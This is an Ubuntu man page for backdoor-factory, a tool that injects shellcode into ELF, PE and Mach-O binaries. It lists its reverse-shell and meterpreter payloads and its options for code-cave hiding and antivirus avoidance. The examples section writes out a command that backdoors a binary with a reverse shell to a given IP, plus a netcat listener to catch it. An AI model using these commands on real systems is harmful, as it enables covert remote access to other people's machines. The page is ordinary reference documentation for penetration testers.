<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>backdoor-factory - inject predefined or user-defined shellcode in binaries</title>
    <style>
        body { font-family: monospace; margin: 20px; line-height: 1.4; }
        a { color: #0066cc; }
        pre { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="main-content">
<section class="p-strip is-bordered">
<div class="row">
<div class="col-3 u-hide--small u-hide" id="toc">
</div>
<div id="tableWrapper">
<p id="distroAndSection"></p>

Provided by: <a href="https://launchpad.net/ubuntu/jammy/+package/backdoor-factory">backdoor-factory_3.4.2+dfsg-5_all</a> <br><br><pre>
</pre><h4><b>NAME</b></h4><pre>
       backdoor-factory - inject predefined or user-defined shellcode in binaries

</pre><h4><b>SYNOPSIS</b></h4><pre>
       <b>backdoor-factory</b> <b>[options]</b>

</pre><h4><b>DESCRIPTION</b></h4><pre>
       <b>backdoor-factory</b> patch executable binaries with user desired shellcode and continue normal execution of
       the prepatched state.

       This tool is for security professionals and researchers only.

       This tool doesn't support relocatable ELF executable (i.e. compiled with the -fPIE option, suggested by
       the Debian hardening requirements, see <b>https://wiki.debian.org/Hardening</b>)

       Binaries such as ssh may not be caved correctly, as binaries such as dolphin (at the time of this man
       page is written) are.

</pre><h4><b>OPTIONS:</b></h4><pre>
       <b>-h</b>, <b>--help</b>
         show this help message and exit

       <b>-f</b> <b>FILE</b>, <b>--file=FILE</b>
         File to backdoor

       <b>-s</b> <b>SHELL</b>, <b>--shell=SHELL</b>
         Payloads that are available for use. Use 'show' to see payloads.

       <b>-H</b> <b>HOST</b>, <b>--hostip=HOST</b>
         IP of the C2 for reverse connections.

       <b>-P</b> <b>PORT</b>, <b>--port=PORT</b>
         The port to either connect back to for reverse shells or to listen on for bind shells

       <b>-J</b>, <b>--cave_jumping</b>
         Select this options if you want to use code cave jumping to further hide your shellcode in the binary.

       <b>-a</b>, <b>--add_new_section</b>
         Mandating that a new section be added to the exe (better success) but less av avoidance

       <b>-U</b> <b>SUPPLIED_SHELLCODE</b>, <b>--user_shellcode=SUPPLIED_SHELLCODE</b>
         User supplied shellcode, make sure that it matches the architecture that you are targeting.

       <b>-c</b>, <b>--cave</b>
         The cave flag will find code caves that can be used for stashing shellcode. This will print to all the
       code caves of a specific size.The -l flag can be use with this setting.

       <b>-l</b> <b>SHELL_LEN</b>, <b>--shell_length=SHELL_LEN</b>
         For use with -c to help find code caves of different sizes

       <b>-o</b> <b>OUTPUT</b>, <b>--output-file=OUTPUT</b>
         The backdoor output file path. Parent dir(s) must exist

       <b>-n</b> <b>NSECTION</b>, <b>--section=NSECTION</b>
         New section name must be less than seven characters

       <b>-d</b> <b>DIR</b>, <b>--directory=DIR</b>
         This is the location of the files that you want to backdoor. You can make a directory of file
       backdooring faster by forcing the attaching of a codecave to the exe by using the -a setting.

       <b>-w</b>, <b>--change_access</b>
         This flag changes the section that houses the codecave to RWE. Sometimes this is necessary. Enabled by
       default. If disabled, the backdoor may fail.

       <b>-i</b>, <b>--injector</b>
         This command turns the backdoor factory in a hunt and shellcode inject type of mechanism. Edit the
       target settings in the injector module.

       <b>-u</b> <b>SUFFIX</b>, <b>--suffix=SUFFIX</b>
         For use with injector, places a suffix on the original file for easy recovery

       <b>-D</b>, <b>--delete_original</b>
         For use with injector module.  This command deletes the original file.  Not for use in production
       systems.
         (Author not responsible for stupid uses.)

       <b>-O</b> <b>DISK_OFFSET</b>, <b>--disk_offset=DISK_OFFSET</b>
         Starting point on disk offset, in bytes. Some authors want to obfuscate their on disk offset to avoid
       reverse engineering, if you find one of those files use this flag, after you find the offset.

       <b>-S</b>, <b>--support_check</b>
         To determine if the file is supported by BDF prior to backdooring the file. For use by itself or with
       verbose. This check happens automatically if the backdooring is attempted.

       <b>-M</b>, <b>--cave-miner</b>
         Future use, to help determine smallest shellcode possible in a PE file

       <b>-q</b>, <b>--no_banner</b>
         Kills the banner.

       <b>-v</b>, <b>--verbose</b>
         For debug information output.

       <b>-T</b> <b>IMAGE_TYPE</b>, <b>--image-type=IMAGE_TYPE</b>
         ALL, x86, or x64 type binaries only. Default=ALL

       <b>-Z</b>, <b>--zero_cert</b>
         Allows for the overwriting of the pointer to the PE certificate table effectively removing the
       certificate from the binary for all intents and purposes.

       <b>-R</b>, <b>--runas_admin</b>
         EXPERIMENTAL Checks the PE binaries for 'requestedExecutionLevel level="highestAvailable"'. If this
       string is included in the binary, it must run as system/admin. If not in Support Check mode it will
       attmept to patch highestAvailable into the manifest if requestedExecutionLevel entry exists.

       <b>-L</b>, <b>--patch_dll</b>
         Use this setting if you DON'T want to patch DLLs. Patches by default.

       <b>-F</b> <b>FAT_PRIORITY</b>, <b>--fat_priority=FAT_PRIORITY</b>
         For MACH-O format. If fat file, focus on which arch to patch. Default is x64. To force x86 use -F x86,
       to force both archs use -F ALL.

       <b>-B</b> <b>BEACON</b>, <b>--beacon=BEACON</b>
         For payloads that have the ability to beacon out, set the time in secs

       <b>-m</b> <b>PATCH_METHOD</b>, <b>--patch-method=PATCH_METHOD</b>
         Patching methods for PE files, 'manual','automatic', replace and onionduke

       <b>-b</b> <b>SUPPLIED_BINARY</b>, <b>--user_malware=SUPPLIED_BINARY</b>
         For onionduke. Provide your desired binary.

       <b>-X</b>, <b>--xp_mode</b>
         Default: DO NOT support for XP legacy machines, use -X to support XP. By default the binary will crash
       on XP machines (e.g. sandboxes)

       <b>-A</b>, <b>--idt_in_cave</b>
         EXPERIMENTAL By default a new Import Directory Table is created in a new section, by calling this flag
       it will be put in a code cave.  This can cause bianry failure is some cases. Test on target binaries
       first.

       <b>-C</b>, <b>--code_sign</b>
         For those with codesigning certs wishing to sign PE binaries only. Name your signing key and private
       key signingcert.cer and signingPrivateKey.pem respectively in the certs directory it's up to you to
       obtain signing certs.

       <b>-p</b>, <b>--preprocess</b>
         To execute preprocessing scripts in the preprocess directory

</pre><h4><b>ABOUT</b> <b>THE</b> <b>SHELLCODES</b></h4><pre>
       There is various predefined shellcode in backdoor-factory. Their availability depends on the target type
       (ELF32, ELF64, PE32...). The shellcodes list is defined below.

</pre><h4><b>for</b> <b>all</b> <b>intel-based</b> <b>(x86</b> <b>and</b> <b>x86_64</b> <b>architecture)</b></h4><pre>
       <b>reverse_shell_tcp</b>
         need: a remote host and port to be set
         permits: remote shell access

       <b>delay_reverse_shell_tcp</b>
         need: a remote host and port to be set
         permits: remote shell access

       <b>beaconing_reverse_shell_tcp</b>
         need: a beacon, a remote host and port to be set
         permits: remote shell access

       <b>user_supplied_shellcode</b>
         need: a user-defined shellcode ready to inject
         permits: depend on the shellcode

</pre><h4><b>Linux</b> <b>specific</b> <b>shellcodes</b></h4><pre>
       <b>reverse_tcp_stager</b>
         need:
         permits:

</pre><h4><b>Windows</b> <b>PE32</b> <b>exe</b> <b>shellcodes</b></h4><pre>
       <b>reverse_shell_tcp_inline</b>
         needs: a remote host and port to be set
         permits: remote shell access

       <b>reverse_shell_tcp_stager_threaded</b>
         needs: a remote host and port to be set
         permits: Inject the meterpreter server DLL via the Reflective Dll Injection payload

       <b>meterpreter_reverse_https_threaded</b>
         needs: a remote host and port to be set
         permits: meterpreter over https transport

       <b>user_applied_shellcode_threaded</b>
         needs: a user-defined shellcode ready to inject
         permits: depend on the shellcode

       <b>iat_reverse_tcp_inline</b>
         needs: a remote host and port to be set
         permits:

       <b>iat_reverse_tcp_inline_threaded</b>
         needs: a remote host and port to be set
         permits:

       <b>iat_reverse_tcp_stager_threaded</b>
         needs: a remote host and port to be set
         permits: Inject the meterpreter server DLL via the Reflective Dll Injection payload

       <b>iat_user_applied_shellcode_threaded</b>
         needs: a user-defined shellcode ready to inject
         permits: depend on the shellcode

</pre><h4><b>Windows</b> <b>PE64</b> <b>exe</b> <b>shellcodes</b></h4><pre>
       <b>delay_reverse_shell_tcp</b>
         needs: a remote host and port to be set
         permits: remote shell access

       <b>reverse_shell_tcp</b>
         needs: a remote host and port to be set
         permits: remote shell access

       <b>beaconing_reverse_shell_tcp</b>
         needs:a beacon, a remote host and port to be set
         permits: remote shell access

       <b>user_supplied_shellcode</b>
         needs: a user-defined shellcode ready to inject
         permits: depend on the shellcode

</pre><h4><b>EXAMPLES</b></h4><pre>
       Example of cavecoding an ELF binary, by integrating a remote shell access through a remote TCP listener
       (e.g. netcat):

       <b>backdoor-factory</b> <b>-f</b> <b>/usr/bin/dolphin</b> <b>-H</b> <b>172.16.0.15</b> <b>-P</b> <b>8080</b> <b>-s</b> <b>reverse_shell_tcp</b>

       On the host behind the IP 172.16.0.15, start netcat in listen mode:

       <b>$</b> <b>netcat</b> <b>-l</b> <b>172.16.0.15</b> <b>8080</b>

       On the target, start the backdoored binary: <b>./backdoored/dolphin</b>

       Now, on the host 172.16.0.15, just use your shell.

</pre><h4><b>HISTORY</b></h4><pre>
       May 2017, Originally compiled by Philippe Thierry (phil at reseau-libre dot com)

Philippe Thierry                            Backdoor-Factory Man Page                        <u><a href="../man1/BACKDOOR-FACTORY.1.html">BACKDOOR-FACTORY</a></u>(1)
</pre>
 </div>
</div></section>
</div>
</body>
</html>